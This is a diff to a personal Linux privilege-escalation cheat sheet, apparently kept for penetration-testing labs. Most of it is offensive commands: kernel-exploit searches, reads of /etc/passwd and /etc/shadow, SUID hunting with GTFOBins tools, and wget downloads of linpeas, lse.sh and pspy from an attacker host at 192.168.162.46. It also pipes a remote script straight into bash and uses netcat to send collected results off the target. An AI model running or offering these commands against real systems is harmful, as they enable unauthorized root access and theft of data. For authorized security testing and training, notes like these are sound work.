@@ -10,12 +10,14 @@ searchsploit linux kernel ubuntu 16.04
 searchsploit linux kernel 1.2 debian priv esc 
 searchsploit linux kernel | grep -v dos | grep ' 3\.' | grep -i 'root\|privilege\|exploit'  
 linux-exploit-suggester.sh --uname <uname-a string>
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null    
 
+=================================== 
 alias ll='ls -lah --color=auto' 
 cat /etc/passwd
 grep -vE 'nologin|false' /etc/passwd  
 ll /etc/passwd /etc/shadow 
-  
+
 =================================== 
 sudo -l   
 find / -perm -u=s -type f 2>/dev/null   
@@ -25,7 +27,15 @@ find / -perm /u=s,g=s -type f 2>/dev/null | sort
 =================================== 
 https://gtfobins.github.io  
 https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py 
-lse.sh -i -l1
+
+ggtfobins --exploit shell --bins cpan,bash 
+https://github.com/mzfr/gtfo 
+gtfo -ls bins 
+gtfo -b apt 
+gtfo -ls exe 
+gtfo -e leadvpack.dll 
+
+lse.sh -i -l1   ..will alert unusual SUIDS
 
 sudo -u bob /bin/bash 
 sudo su 
@@ -97,6 +107,8 @@ ll /private
 
 find / -type f -user bob 2>/dev/null 
 find / -type d -user bob 2>/dev/null  
+
+
 
 =================================== 
 mount
@@ -190,6 +202,7 @@ sudo python3 -m http.server 80
 
 cd /var/tmp 
 wget http://192.168.162.46:80/linpeas.sh                  ..best
+wget http://192.168.162.46:80/lse.sh                      ..compliment to linpeas
 wget http://192.168.162.46:80/pspy32                      ..crons
 wget http://192.168.162.46:80/suid3num.py                 ..suid check
 wget http://192.168.162.46:80/Linuxprivchecker.py         ..prefer 
@@ -204,9 +217,17 @@ curl 192.168.162.46:80/linux-exploit-suggester.sh | bash  ..autorun
 uname -a 
 kali> linux-exploit-suggester.sh --uname <uname-a string>
 
-Output
+lse.sh 
+tries to gradualy expose the information depending on its privesc importance
+lse.sh -i -l1 2>&1 | tee lse.txt | less -r      ..level 1 Good 
+lse.sh -i -l2 2>&1 | tee lse.txt | less -r      ..level 2 Deeper 
+
+
+===================================
+Results
 linpeas.sh -a > /var/tmp/linpeas.txt  
-less -r /dev/shm/linpeas.txt
+linpeas.sh 2>&1 | tee /var/tmp/linpeas.txt
+less -r /var/tmp/linpeas.txt
 
 Results to Kali
 kali> nc -lvnp 9090 > linpeas.txt 
@@ -214,6 +235,8 @@ linx> nc 192.168.162.46 9090 < linpeas.txt
 
 Send to Target
 scp pspy bob@192.168.200.5
+
+
 
 ===================================
 Update tools:
